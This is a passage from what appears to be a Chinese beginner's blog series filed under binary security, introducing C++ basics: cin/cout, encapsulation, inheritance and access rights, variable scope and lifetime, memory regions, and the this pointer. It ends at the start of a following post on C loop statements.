      <url>/2023/05/08/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-8-C-%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E8%AE%B2%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="1-C语言到C-速成"><a href="#1-C语言到C-速成" class="headerlink" title="1.C语言到C++速成"></a>1.C语言到C++速成</h1><h2 id="不同点？"><a href="#不同点？" class="headerlink" title="不同点？"></a>不同点？</h2><p>C是面向过程的过程。C++是面向对象的高级语言。C更偏向于写一些底层的操作：比如 嵌入式，驱动开发</p><p>C++向下兼容C</p><p>C++比C多了函数库</p><h2 id="HOW学C-？"><a href="#HOW学C-？" class="headerlink" title="HOW学C++？"></a>HOW学C++？</h2><p>当然肯定是把C学好咯。这里简单介绍一下C++就好了</p><p>首先我们看一个C++的hello的入门代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Hello World&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在来看一下一个比较复杂的C语言的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> m = <span class="number">0</span>, fm = <span class="number">1</span>, sum = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> n, i;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n), n != <span class="number">-1</span>) &#123;</span><br><span class="line">m = <span class="number">0</span>, fm = <span class="number">1</span>, sum = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line">fm = m + <span class="number">1</span>;</span><br><span class="line">m = sum;</span><br><span class="line">sum = m + fm;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%lld %lld\n&quot;</span>, m, sum);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和这个C语言等价的C++代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> m = <span class="number">0</span>, fm = <span class="number">1</span>, sum = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> n, i;</span><br><span class="line"><span class="keyword">while</span> (cin &gt;&gt; n, n != <span class="number">-1</span>) &#123;</span><br><span class="line">m = <span class="number">0</span>, fm = <span class="number">1</span>, sum = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line">fm = m + <span class="number">1</span>;</span><br><span class="line">m = sum;</span><br><span class="line">sum = m + fm;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//printf(&quot;%lld %lld\n&quot;, m, sum);</span></span><br><span class="line">cout &lt;&lt; m &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; sum &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>#include <iostream>：和#include &lt;stdio.h&gt;差不多</p><p>using namespace std;不理解过这句话，反正就是要。</p><p>定义变量的方式和C一样。</p><p>cin全名叫 标准输⼊流和C语言的scanf差不多，对比理解。这个更方便，因为不需要变量的类型直接cout&lt;&lt;（变量名字）</p><p>cout全名叫 标准输出流和C语言中的printf差不多。也是直接cout&gt;&gt;(变量名)就可了</p><p>endl 和 ‘\n’ 换行符 差不多。</p><p>其他的for  if else 和C 一样</p><h1 id="2-C-封装和继承"><a href="#2-C-封装和继承" class="headerlink" title="2.C++封装和继承"></a>2.C++封装和继承</h1><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p>定义：封装就是把抽象得到的数据和行为相结构，形成一个有机的整体，也就是把数据操作数据的源代码进行有机的结合，形成类。其中数据和函数都是类的成员，目的在于对于对象的使用者和设计着分开，可以提高软件的可维护性和可修改性</p><p><strong>特性</strong>：1.结核性，就是把属性和方法结合。2.信息隐藏性，利用接口机制隐藏内部实现的细节，只留下对外的接口。3.实现代码的重复利用</p><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>定义：继承是新类从已有的类那里得到已有的特性。类的派生指的是从已有类产生新类的过程。原有的类成为基类或父类，产生的新类为派生类或者子类，子类继承父类后，可以创建子类对象来调用基类函数，变量等</p><p><strong>单一继承</strong>：继承一个父类</p><p><strong>多重继承</strong>：继承多个父类，类于类之间需要用逗号隔开，类名之前要又继承权限，假设两个或两个基类都有某个变量或者函数，在子类中调用的时候需要加上类的名字加以限定修饰    c.a::i = 1;</p><p><strong>菱形继承</strong>：也就是继承的样子成为了一个菱形。B 和 C同时分别单一继承 A ， D 多重继承B和C。着就是菱形继承。</p><blockquote><p>但是这样D里面就有2份A 如何解决呢？就出现了虚继承。这里就不展开讲述了。现在只是稍微的知道点C++而不是深入的学习C++</p></blockquote><p><strong>继承权限</strong>：继承方式规定了如何访问继承的基类的成员。继承方式指定了子类成员以及类外对于从基类继承的成员的访问权限</p><p><strong>继承权限</strong>：子类继承基类除构造和析构函数以外的所有成员</p><p>继承可以扩展已存在的代码，目的也是为了代码重用</p><p>继承分为接口继承和实现继承</p><p>普通成员函数的接口总是会被继承：子类继承一份接口和一份强制实现</p><p>普通虚函数被子类重写：子类继承一份接口和一份缺省实现【默认..】</p><p>纯虚函数只能被子类继承接口：子类继承一份接口，没有继承实现</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230508223430823.png" alt="image-20230508223430823"></p><p>例子：这个例子是编译不成功的，只是为了更好的说明继承权限的作用罢了</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> <span class="comment">//⽗类</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">eat</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;animal eat&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sleep</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;animal sleep&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">breathe</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;animal breathe&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Fish</span> : <span class="keyword">public</span> Animal <span class="comment">//⼦类</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">eat</span>(); <span class="comment">//此时eat()的访问权限为public，在类内部能够访问</span></span><br><span class="line"><span class="built_in">sleep</span>(); <span class="comment">//此时sleep()的访问权限为protected，在类内部能够访问</span></span><br><span class="line"><span class="built_in">breathe</span>(); <span class="comment">//此时breathe()的访问权限为no access，在类内部不能够访问</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Fish f;</span><br><span class="line">f.<span class="built_in">eat</span>(); <span class="comment">//此时eat()的访问权限为public，在类外部能够访问</span></span><br><span class="line">f.<span class="built_in">sleep</span>(); <span class="comment">//此时sleep()的访问权限为protected，在类外部不能够访问</span></span><br><span class="line">f.<span class="built_in">breathe</span>()； <span class="comment">//此时breathe()的访问权限为no access，在类外部不能够访问</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ok</p><p>再来看一个例子</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Adder</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">// 构造函数</span></span><br><span class="line"><span class="built_in">Adder</span>(<span class="type">int</span> i = <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">total = i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 对外的接⼝</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">addNum</span><span class="params">(<span class="type">int</span> number)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">total += number;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 对外的接⼝</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getTotal</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> total;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="comment">// 对外隐藏的数据</span></span><br><span class="line"><span class="type">int</span> total;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Adder a;</span><br><span class="line"></span><br><span class="line">a.<span class="built_in">addNum</span>(<span class="number">10</span>);</span><br><span class="line">a.<span class="built_in">addNum</span>(<span class="number">20</span>);</span><br><span class="line">a.<span class="built_in">addNum</span>(<span class="number">30</span>);</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Total &quot;</span> &lt;&lt; a.<span class="built_in">getTotal</span>() &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>构造函数就是对象在被生成的时候会自动执行的代码，且名字需要和类的名字一样。</li></ul><blockquote><p>直接类名字()</p></blockquote><ul><li>析构函数就是对象被删除的时候会自动执行的代码，也需要和类的名字一样。</li></ul><blockquote><p>直接 ~类名字()</p></blockquote><p>对外隐藏的private 只有通过接口来实现对其的使用</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">fun2</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">fun1</span>();</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">fun1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;fun1&quot;</span>&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>调用fun2就相当于去执行了fun1</p><p>这就是我自己的片面的理解，我也没学过…..</p><h1 id="3-生命周期和作用域"><a href="#3-生命周期和作用域" class="headerlink" title="3.生命周期和作用域"></a>3.生命周期和作用域</h1><h2 id="作用域和生存周期："><a href="#作用域和生存周期：" class="headerlink" title="作用域和生存周期："></a>作用域和生存周期：</h2><p>C++变量有2个非常重要的属性：作用域和生命周期。从两个不同的维度描述了一个变量–时间和空间。</p><p><strong>作用域</strong>：是一个变量可以被引用的范围。</p><p><strong>生命周期</strong>：是一个变量可以被引用的时间段。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">blocky</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">1</span>;</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;i = &quot;</span> &lt;&lt; i &lt;&lt; endl;</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> q = <span class="number">1</span>;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;q = &quot;</span> &lt;&lt; q &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;q = &quot;</span> &lt;&lt; q &lt;&lt; endl;<span class="comment">//这个q访问不到</span></span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;i = &quot;</span> &lt;&lt; i &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;i = &quot;</span> &lt;&lt; i &lt;&lt; endl;<span class="comment">//这里的i访问不到</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">blocky</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>可以发现用{}括起来的是一个完整的代码区域，由于编译器的顺序编译，q在里面定义的，所以在外面就访问不到，显然就是超出了q的作用域</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230508231153378.png" alt="image-20230508231153378" style="zoom:50%;" /><p>一个程序系统会分配内存块为4个区域：</p><ol><li>代码区：存放程序的代码，也就是程序的各个函数代码块</li><li>全局数据区：存放程序的全局数据和静态数据</li><li>堆区：存放数据的动态数据</li><li>栈区：存放程序的局部数据，也就是各个函数中的数据</li></ol><p>初始化的数据放在.data，未初始化的数据放在bss</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x;<span class="comment">//bss段</span></span><br><span class="line"><span class="type">int</span> y=<span class="number">1</span>;<span class="comment">//.data段</span></span><br></pre></td></tr></table></figure><p>局部变量也就是内部变量。局部变量是在函数内定义说明。作用域只在函数里面呢，离开了函数调用就错啦</p><p>全局变量也就是外部变量，在函数的外部定义的变量。不属于任何一个函数，而是属于一个源程序文件。作用域是整个源程序</p><h2 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h2><ul><li>作用域：全局作用域（全局变量只需要在一个源文件中定义，就可以作用域所有的源文件）</li><li>生命周期：程序只要在运行就一直有</li><li>引用方式：在其他文件中使用必须使用extern关键字去生命要应用的全局变量</li><li>内存分布：全局数据区</li><li>注意：如果两个文件中都定义了相同名字的全局变量，连接就会错误</li></ul><h2 id="静态全局变量"><a href="#静态全局变量" class="headerlink" title="静态全局变量"></a>静态全局变量</h2><ul><li>作用域：只在被定义的文件中可见</li><li>生命周期：程序运行期一直存放</li><li>内存分布：全局数据区</li><li>定义的方式：static关键字和const关键字</li></ul><blockquote><p>这里static 和 const 是不一样的，自行百度。这里只是大概知道。以后会出C和C++详细的学习</p></blockquote><h2 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h2><ul><li>作用域：只在局部作用域中可以见</li><li>生命周期：程序运行出局的时候作用域就无啦</li><li>内存分布：栈区</li></ul><h2 id="静态局部变量"><a href="#静态局部变量" class="headerlink" title="静态局部变量"></a>静态局部变量</h2><ul><li>作用域：只能在局部的作用域可以见</li><li>生命周期：程序运行就一直在</li><li>内存分布：全局数据区</li><li>定义方法：在局部作用域中用static定义</li></ul><h1 id="4-This指针"><a href="#4-This指针" class="headerlink" title="4.This指针"></a>4.This指针</h1><p>在C++中，每一个对象都能通过this指针来访问自己的地址this指针式所有成员函数的隐含的参数。因此，在成员函数内部可以用它来指向调用的对象。</p><h2 id="this指针的使用"><a href="#this指针的使用" class="headerlink" title="this指针的使用"></a>this指针的使用</h2><p>一种情况是：在类的非静态成员函数中返回类对象本身的时候，直接用 return *this;</p><p>另外一种情况是：当参数和成员变量相同的时候。this-&gt;n=n【不能写n=n】</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> x, y;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Point</span>(<span class="type">int</span> a, <span class="type">int</span> b) &#123; x = a; y = b; &#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MovePoint</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123; x += a; y += b; &#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; cout &lt;&lt; <span class="string">&quot;x=&quot;</span> &lt;&lt; x &lt;&lt; <span class="string">&quot;y=&quot;</span> &lt;&lt; y &lt;&lt; endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="function">Point <span class="title">point1</span><span class="params">(<span class="number">10</span>, <span class="number">10</span>)</span></span>; <span class="comment">//给point1赋值</span></span><br><span class="line">point1.<span class="built_in">MovePoint</span>(<span class="number">2</span>, <span class="number">2</span>); <span class="comment">//当对象point1调⽤MovePoint(2,2)函数时，即将point1对象的地址传递给了this指针。</span></span><br><span class="line">point1.<span class="built_in">print</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230508234452691.png" alt="image-20230508234452691"></p><p>先对point1进行赋值后，然后调用Point中的MovePoint函数对point1的值进行了改变。</p><p>MovePoint函数的原型是void MovePoint(Point *this, int a, int b);第一个参数是指向该类对象的一个指针，我们在定义成员函数时没看见这个参数是因为这个参数在类中是隐藏的。这样point1的地址传递给了this，所以MovePoin函数中便显式的写成：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">MovePoint</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123; <span class="keyword">this</span>-&gt;x +=a; <span class="keyword">this</span>-&gt; y+= b;&#125;</span><br></pre></td></tr></table></figure><p>所以该函数过程可以写成</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">point1.x+=a;point1.y+=b;</span><br></pre></td></tr></table></figure><p>对于一个类的实例来说，你可以看到它的成员函数，成员变量。但是看不到它的实例本身。</p><p>this式一个指针，它时刻指向你这个实例本身。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">get</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> i; &#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">set</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;i = x;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;this指针保存的内存地址为:&quot;</span> &lt;&lt;<span class="keyword">this</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">A a;</span><br><span class="line">a.<span class="built_in">set</span>(<span class="number">9</span>);</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;对象a所在的内存地址为:&quot;</span> &lt;&lt; &amp;a &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;对象a所保存的值为:&quot;</span> &lt;&lt; a.<span class="built_in">get</span>() &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">A b;</span><br><span class="line">b.<span class="built_in">set</span>(<span class="number">999</span>);</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;对象b所在的内存地址为:&quot;</span> &lt;&lt; &amp;b &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;对象b所保存的值为:&quot;</span> &lt;&lt; b.<span class="built_in">get</span>() &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230508235128026.png" alt="image-20230508235128026"></p><p><strong>OK发现一个很牛皮的东西</strong>：this指针指向当前对象！！！！</p><p>对象a的内存地址和对象a的this指针的地址相同。都是010FFCF0</p><p>当运行到对象b的时候，它的内存地址和它所对应的this指针指向的内存地址式一样的，说明this指针记录变量的式当前对象的内存地址。</p><p><strong>this指针指向当前对象</strong></p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>C语言语句深入理解（7）</title>
      <link href="/2023/05/07/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-7-C%E8%AF%AD%E8%A8%80%E8%AF%AD%E5%8F%A5%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3/"/>
      <url>/2023/05/07/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-7-C%E8%AF%AD%E8%A8%80%E8%AF%AD%E5%8F%A5%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="1-循环语句"><a href="#1-循环语句" class="headerlink" title="1.循环语句"></a>1.循环语句</h1><ul><li><p>while</p></li><li><p>for</p></li><li><p>do while</p></li><li><p>break:直接跳出循环</p></li><li><p>continue:跳过本次循环后面的代码进入下一次的判断</p></li></ul><h2 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* 局部变量定义 */</span></span><br><span class="line"><span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="comment">/* while 循环执⾏ */</span></span><br><span class="line"><span class="keyword">while</span> (a &lt; <span class="number">20</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a 的值： %d\n&quot;</span>, a);</span><br><span class="line">a++;</span><br><span class="line"><span class="keyword">if</span> (a &gt; <span class="number">15</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* 使⽤ break 语句终⽌循环 */</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span 